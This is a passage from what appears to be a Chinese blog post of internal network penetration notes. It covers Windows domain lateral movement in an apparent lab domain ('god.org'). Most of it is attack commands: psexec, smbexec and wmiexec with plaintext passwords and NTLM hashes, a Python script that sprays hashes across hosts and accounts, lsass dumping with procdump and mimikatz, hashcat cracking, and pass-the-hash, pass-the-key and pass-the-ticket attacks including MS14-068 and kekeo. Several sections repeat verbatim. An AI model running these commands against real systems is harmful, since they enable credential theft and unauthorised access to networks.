class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>domain/administrator<span class="hljs-variable">@10</span>.<span class="hljs-number">1.2</span>.<span class="hljs-number">3</span><br>psexec -hashes <span class="hljs-symbol">:</span><span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c ./administrator<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">32</span> <br><br><span class="hljs-title class_">ELIXIR</span><br></code></pre></td></tr></table></figure><p>●smbexec 无需先 ipc 链接 明文或 hash 传递（第三方库）</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">smbexec god/<span class="hljs-symbol">administrator:</span><span class="hljs-title class_">Admin12345</span><span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span><br>smbexec ./<span class="hljs-symbol">administrator:</span>admin!@<span class="hljs-comment">#45@192.168.3.32</span><br>smbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>./admin<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span><br>smbbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>domain/admin<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span><br>smbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c ./administrator<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">32</span><br>smbexec -hashes <span class="hljs-symbol">:ccef208c6485269c20db2cad21734fe7</span> god/administrator<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span><br><br><span class="hljs-title class_">ELIXIR</span><br></code></pre></td></tr></table></figure><p>案例 3-域横向移动 WMI 服务利用-cscript,wmiexec,wmic</p><p>WMI(Windows Management Instrumentation) 是通过 135 端口进行利用，支持用户名明文或者 hash 的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p><p>●自带 WMIC 明文传递 无回显</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.21</span> /<span class="hljs-keyword">user</span>:administrator /<span class="hljs-keyword">password</span>:Admin12345 process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;<br><br>PGSQL<br></code></pre></td></tr></table></figure><p>●自带 cscript 明文传递 有回显</p><p>wmiexec v1.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345<br><br>AWK<br></code></pre></td></tr></table></figure><p>●套件 impacket wmiexec 明文或 hash 传递 有回显 exe 版本</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm">wmiexec ./administrator:admin!@<span class="hljs-variable">#45</span><span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">32</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>wmiexec god/administrator:Admin<span class="hljs-number">12345</span><span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>wmiexec -hashes :<span class="hljs-number">518</span>b<span class="hljs-number">98</span>ad<span class="hljs-number">4178</span>a<span class="hljs-number">53695</span>dc<span class="hljs-number">997</span>aa<span class="hljs-number">02</span>d<span class="hljs-number">455</span><span class="hljs-keyword">c</span> ./administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">32</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>wmiexec -hashes :ccef<span class="hljs-number">208</span><span class="hljs-keyword">c</span><span class="hljs-number">6485269</span><span class="hljs-keyword">c</span><span class="hljs-number">20</span>db<span class="hljs-number">2</span>cad<span class="hljs-number">21734</span>fe<span class="hljs-number">7</span> god/administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>LLVM<br></code></pre></td></tr></table></figure><p>案例 4-域横向移动以上服务 hash 批量利用-python 编译 exe</p><p>pyinstaller.exe -F fuck_neiwang_002.py</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs nsis">import os,time<br><br>ips=&#123;<br><br>    <span class="hljs-string">&#x27;192.168.3.21&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;192.168.3.25&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;192.168.3.29&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;192.168.3.30&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;192.168.3.32&#x27;</span><br><br>&#125;<br><br>users=&#123;<br><br>    <span class="hljs-string">&#x27;Administrator&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;boss&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;dbadmin&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;fileadmin&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;mack&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;mary&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;webadmin&#x27;</span><br><br>&#125;<br><br>hashs=&#123;<br><br>    <span class="hljs-string">&#x27;ccef208c6485269c20db2cad21734fe7&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;518b98ad4178a53695dc997aa02d455c&#x27;</span><br><br>&#125;<br><br>for ip in ips:<br><br>    for <span class="hljs-literal">user</span> in users:<br><br>        for mimahash in hashs:<br><br>            \<span class="hljs-comment">#wmiexec -hashes :hashgod/user@ipwhoami</span><br><br>            <span class="hljs-keyword">exec</span> = <span class="hljs-string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="hljs-string">&quot; god/&quot;</span>+<span class="hljs-literal">user</span>+<span class="hljs-string">&quot;@&quot;</span>+ip+<span class="hljs-string">&quot; whoami&quot;</span><br><br>            <span class="hljs-literal">print</span>(<span class="hljs-string">&#x27;---&gt;&#x27;</span> + <span class="hljs-keyword">exec</span> + <span class="hljs-string">&#x27;&lt;---&#x27;</span>)<br><br>            os.<span class="hljs-params">system</span>(<span class="hljs-keyword">exec</span>)<br><br>            time.<span class="hljs-keyword">sleep</span>(<span class="hljs-number">0.5</span>) <br><br>            exec1 = <span class="hljs-string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="hljs-string">&quot; god/&quot;</span>+<span class="hljs-literal">user</span>+<span class="hljs-string">&quot;@&quot;</span>+ip+<span class="hljs-string">&quot; whoami&quot;</span><br><br>            <span class="hljs-literal">print</span>(<span class="hljs-string">&#x27;---&gt;&#x27;</span> + exec1 + <span class="hljs-string">&#x27;&lt;---&#x27;</span>)<br><br>            os.<span class="hljs-params">system</span>(exec1)<br><br>            time.<span class="hljs-keyword">sleep</span>(<span class="hljs-number">0.5</span>)<br><br>PYTHON<br></code></pre></td></tr></table></figure><h3 id="9-Procdump-Mimikatz-配合获取"><a href="#9-Procdump-Mimikatz-配合获取" class="headerlink" title="9.Procdump+Mimikatz 配合获取"></a>9.Procdump+Mimikatz 配合获取</h3><p>目标机器上执行：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">procdump -accepteula -ma lsass<span class="hljs-selector-class">.exe</span> lsass<span class="hljs-selector-class">.dmp</span><br><br>VIM<br></code></pre></td></tr></table></figure><p>本机 mimikatz 上执行：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso">sekurlsa<span class="hljs-type">::minidump</span> lsass.dmp<br>sekurlsa<span class="hljs-type">::logonPasswords</span> <span class="hljs-literal">full</span><br><br>LASSO<br></code></pre></td></tr></table></figure><p>●其他工具：</p><p>Pwdump7</p><p>QuarksPwdump</p><p>QuarksPwDump_v0.2b.zip(281 KB)</p><p>●HASH破解：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">hashcat -a0  -m <span class="hljs-number">1000</span> hash <span class="hljs-built_in">file</span> <span class="hljs-comment">--force</span><br><br>APPLESCRIPT<br></code></pre></td></tr></table></figure><p><a href="https://ophcrack.sourceforge.io/tables.php">免费彩虹表下载</a></p><h3 id="10-域横向移动-SMB-服务利用-psexec-smbexec-官方自带"><a href="#10-域横向移动-SMB-服务利用-psexec-smbexec-官方自带" class="headerlink" title="10.域横向移动 SMB 服务利用-psexec,smbexec(官方自带)"></a>10.域横向移动 SMB 服务利用-psexec,smbexec(官方自带)</h3><p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 端口开放。</p><p>●psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.3.32</span>\ipc$ <span class="hljs-string">&quot;admin!@#45&quot;</span> /user:administrator<br><br><span class="hljs-comment"># 需要先有 ipc 链接 -s 以 System 权限运行</span><br>psexec \\<span class="hljs-number">192.168.3.32</span> -s cmd <br><br>NGINX<br></code></pre></td></tr></table></figure><p>●psexec 第二种：不用建立 IPC 直接提供明文账户密码</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">psexec \\<span class="hljs-number">192.168</span>.<span class="hljs-number">3.21</span> -u administrator -p <span class="hljs-title class_">Admin12345</span> -s cmd<br><br><span class="hljs-comment"># 官方 Pstools 无法 采用 hash 连接</span><br><span class="hljs-comment"># 非官方自带-参考 impacket 工具包使用，操作简单，容易被杀</span><br>psexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>./administrator<span class="hljs-variable">@10</span>.<span class="hljs-number">1.2</span>.<span class="hljs-number">3</span><br>psexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>domain/administrator<span class="hljs-variable">@10</span>.<span class="hljs-number">1.2</span>.<span class="hljs-number">3</span><br>psexec -hashes <span class="hljs-symbol">:</span><span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c ./administrator<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">32</span> <br><br><span class="hljs-title class_">ELIXIR</span><br></code></pre></td></tr></table></figure><p>●smbexec 无需先 ipc 链接 明文或 hash 传递（第三方库）</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">smbexec god/<span class="hljs-symbol">administrator:</span><span class="hljs-title class_">Admin12345</span><span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span><br>smbexec ./<span class="hljs-symbol">administrator:</span>admin!@<span class="hljs-comment">#45@192.168.3.32</span><br>smbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>./admin<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span><br>smbbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>domain/admin<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span><br>smbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c ./administrator<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">32</span><br>smbexec -hashes <span class="hljs-symbol">:ccef208c6485269c20db2cad21734fe7</span> god/administrator<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span><br><br><span class="hljs-title class_">ELIXIR</span><br></code></pre></td></tr></table></figure><h3 id="11-域横向移动-WMI-服务利用-cscript-wmiexec-wmic"><a href="#11-域横向移动-WMI-服务利用-cscript-wmiexec-wmic" class="headerlink" title="11.域横向移动 WMI 服务利用-cscript,wmiexec,wmic"></a>11.域横向移动 WMI 服务利用-cscript,wmiexec,wmic</h3><p>WMI(Windows Management Instrumentation) 是通过 135 端口进行利用，支持用户名明文或者 hash 的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p><p>●自带 WMIC 明文传递 无回显</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.21</span> /<span class="hljs-keyword">user</span>:administrator /<span class="hljs-keyword">password</span>:Admin12345 process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;<br><br>PGSQL<br></code></pre></td></tr></table></figure><p>●自带 cscript 明文传递 有回显</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345<br><br>AWK<br></code></pre></td></tr></table></figure><p>●套件 impacket wmiexec 明文或 hash 传递 有回显 exe 版本</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm">wmiexec ./administrator:admin!@<span class="hljs-variable">#45</span><span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">32</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>wmiexec god/administrator:Admin<span class="hljs-number">12345</span><span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>wmiexec -hashes :<span class="hljs-number">518</span>b<span class="hljs-number">98</span>ad<span class="hljs-number">4178</span>a<span class="hljs-number">53695</span>dc<span class="hljs-number">997</span>aa<span class="hljs-number">02</span>d<span class="hljs-number">455</span><span class="hljs-keyword">c</span> ./administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">32</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>wmiexec -hashes :ccef<span class="hljs-number">208</span><span class="hljs-keyword">c</span><span class="hljs-number">6485269</span><span class="hljs-keyword">c</span><span class="hljs-number">20</span>db<span class="hljs-number">2</span>cad<span class="hljs-number">21734</span>fe<span class="hljs-number">7</span> god/administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>LLVM<br></code></pre></td></tr></table></figure><h3 id="12-域横向移动以上服务-hash-批量利用-python-编译-exe"><a href="#12-域横向移动以上服务-hash-批量利用-python-编译-exe" class="headerlink" title="12.域横向移动以上服务 hash 批量利用-python 编译 exe"></a>12.域横向移动以上服务 hash 批量利用-python 编译 exe</h3><p>pyinstaller.exe -F fuck_neiwang_002.py</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs nsis">import os,time<br><br>ips=&#123;<br><br>    <span class="hljs-string">&#x27;192.168.3.21&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;192.168.3.25&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;192.168.3.29&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;192.168.3.30&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;192.168.3.32&#x27;</span><br><br>&#125;<br><br>users=&#123;<br><br>    <span class="hljs-string">&#x27;Administrator&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;boss&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;dbadmin&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;fileadmin&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;mack&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;mary&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;webadmin&#x27;</span><br><br>&#125;<br><br>hashs=&#123;<br><br>    <span class="hljs-string">&#x27;ccef208c6485269c20db2cad21734fe7&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;518b98ad4178a53695dc997aa02d455c&#x27;</span><br><br>&#125;<br><br>for ip in ips:<br><br>    for <span class="hljs-literal">user</span> in users:<br><br>        for mimahash in hashs:<br><br>            \<span class="hljs-comment">#wmiexec -hashes :hashgod/user@ipwhoami</span><br><br>            <span class="hljs-keyword">exec</span> = <span class="hljs-string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="hljs-string">&quot; god/&quot;</span>+<span class="hljs-literal">user</span>+<span class="hljs-string">&quot;@&quot;</span>+ip+<span class="hljs-string">&quot; whoami&quot;</span><br><br>            <span class="hljs-literal">print</span>(<span class="hljs-string">&#x27;---&gt;&#x27;</span> + <span class="hljs-keyword">exec</span> + <span class="hljs-string">&#x27;&lt;---&#x27;</span>)<br><br>            os.<span class="hljs-params">system</span>(<span class="hljs-keyword">exec</span>)<br><br>            time.<span class="hljs-keyword">sleep</span>(<span class="hljs-number">0.5</span>) <br><br>            exec1 = <span class="hljs-string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="hljs-string">&quot; god/&quot;</span>+<span class="hljs-literal">user</span>+<span class="hljs-string">&quot;@&quot;</span>+ip+<span class="hljs-string">&quot; whoami&quot;</span><br><br>            <span class="hljs-literal">print</span>(<span class="hljs-string">&#x27;---&gt;&#x27;</span> + exec1 + <span class="hljs-string">&#x27;&lt;---&#x27;</span>)<br><br>            os.<span class="hljs-params">system</span>(exec1)<br><br>            time.<span class="hljs-keyword">sleep</span>(<span class="hljs-number">0.5</span>)<br><br>NSIS<br></code></pre></td></tr></table></figure><p><a href="https://xiaojun88.github.io/2022/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/1631612310522-a9de1557-6b29-415c-9bec-3d4fecf33e11.png"><img src="D:\blog2\source_posts\内网渗透笔记.assets\1631612310522-a9de1557-6b29-415c-9bec-3d4fecf33e11.png" alt="image.png"></a></p><p>image.png</p><h3 id="13-域横向移动-PTH-传递-mimikatz"><a href="#13-域横向移动-PTH-传递-mimikatz" class="headerlink" title="13.域横向移动 PTH 传递-mimikatz"></a>13.域横向移动 PTH 传递-mimikatz</h3><p>PTH ntlm 传递</p><p>未打补丁下的工作组及域连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7<br>sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c<br>sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7<br>net use \\192.168.3.21\c$<br><span class="hljs-built_in">dir</span> \\192.168.3.21\c$<br><br>POWERSHELL<br></code></pre></td></tr></table></figure><h3 id="14-域横向移动-PTK-传递-mimikatz"><a href="#14-域横向移动-PTK-传递-mimikatz" class="headerlink" title="14.域横向移动 PTK 传递-mimikatz"></a>14.域横向移动 PTK 传递-mimikatz</h3><p>PTK aes256 传递</p><p>打补丁后的工作组及域连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b<br><br>POWERSHELL<br></code></pre></td></tr></table></figure><h3 id="15-域横向移动-PTT-传递-ms14068-kekeo-本地"><a href="#15-域横向移动-PTT-传递-ms14068-kekeo-本地" class="headerlink" title="15.域横向移动 PTT 传递-ms14068&amp;kekeo&amp;本地"></a>15.域横向移动 PTT 传递-ms14068&amp;kekeo&amp;本地</h3><p>类比Cookies</p><p>第一种利用漏洞：能实现普通用户直接获取域控 system 权限</p><p>MS14-068 powershell 执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 查看当前 sid </span><br><span class="hljs-attribute">whoami</span>/user<br><br><span class="hljs-comment"># 查看凭证列表</span><br><span class="hljs-attribute">klist</span><br><br><span class="hljs-comment"># 查看当前机器凭证</span><br><span class="hljs-attribute">kerberos</span>::list<br><br><span class="hljs-comment"># mimikatz 清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="hljs-attribute">kerberos</span>::purge<br><br><span class="hljs-comment"># 删除所有凭证</span><br><span class="hljs-attribute">klist</span> purge<br><br><span class="hljs-comment"># 利用 ms14-068 生成 TGT 数据</span><br><span class="hljs-attribute">MS14</span>-<span class="hljs-number">068</span>.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码<br><span class="hljs-attribute">MS14</span>-<span class="hljs-number">068</span>.exe -u mary@god.org -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1218902331</span> -<span class="hljs-number">2157346161</span>-<span class="hljs-number">1782232778</span>-<span class="hljs-number">1124</span> -d <span class="hljs-number">192.168.3.21</span> -p admin!@#<span class="hljs-number">45</span><br><br><span class="hljs-comment"># 将票据注入到内存中</span><br><span class="hljs-attribute">kerberos</span>::ptc 票据文件<br><span class="hljs-attribute">mimikatz</span>.exe <span class="hljs-string">&quot;kerberos::ptc TGT_mary@god.org.ccache&quot;</span> exit<br><br><span class="hljs-comment"># 查看域名</span><br><span class="hljs-attribute">net</span> time /domain<br><br><span class="hljs-comment"># 利用</span><br><span class="hljs-attribute">dir</span> \\OWA20210CN-God.god.org\c$<br><br><span class="hljs-attribute">POWERSHELL</span><br></code></pre></td></tr></table></figure><p>第二种利用工具 kekeo</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-meta"># 生成票据</span><br>kekeo <span class="hljs-string">&quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;</span><br><br><span class="hljs-meta"># 导入票据</span><br><span class="hljs-symbol">kerberos:</span>:ptt TGT_mary@GOD.ORG_krbtgt~god<span class="hljs-meta">.org</span>@GOD<span class="hljs-meta">.ORG</span>.kirbi<br><br><span class="hljs-meta"># 查看凭证</span><br>klist<br><br><span class="hljs-meta"># 利用 net use 载入</span><br>dir \\OWA20210CN-God.god<span class="hljs-meta">.org</span>\c$<br><br>POWERSHELL<br></code></pre></td></tr></table></figure><p>第三种利用本地票据(需管理权限)</p><p>前提是之前连接过，所以有本地票据，但是票据会过期，有时间限制（10小时）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">privilege::debug<br>sekurlsa::tickets /<span class="hljs-keyword">export</span><br>kerberos::ptt xxxxxxxxxx.xxxx.kirbi<br><br>POWERSHELL<br></code></pre></td></tr></table></figure><p>总结：ptt 传递不需本地管理员权限，连接时主机名连接，基于漏洞,工具,本地票据</p><h3 id="16-国产-Ladon-内网杀器测试验收"><a href="#16-国产-Ladon-内网杀器测试验收" class="headerlink" title="16.国产 Ladon 内网杀器测试验收"></a>16.国产 Ladon 内网杀器测试验收</h3><p>信息收集-协议扫描-漏洞探针-传递攻击等</p><h3 id="17-域横向移动RDP传递-Mimikatz"><a href="#17-域横向移动RDP传递-Mimikatz" class="headerlink" title="17.域横向移动RDP传递-Mimikatz"></a>17.域横向移动RDP传递-Mimikatz</h3><p>除了上述讲到的IPC，WMI，SMB等协议的链接外，获取到的明文密码或HASH密文也可以通过RDP协议进行链接操作</p><p>RDP协议连接：判断对方远程桌面服务是否开启（默认：3389），端口扫描判断</p><p>RDP明文密码链接</p><p>Windows：</p><p>mstsc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 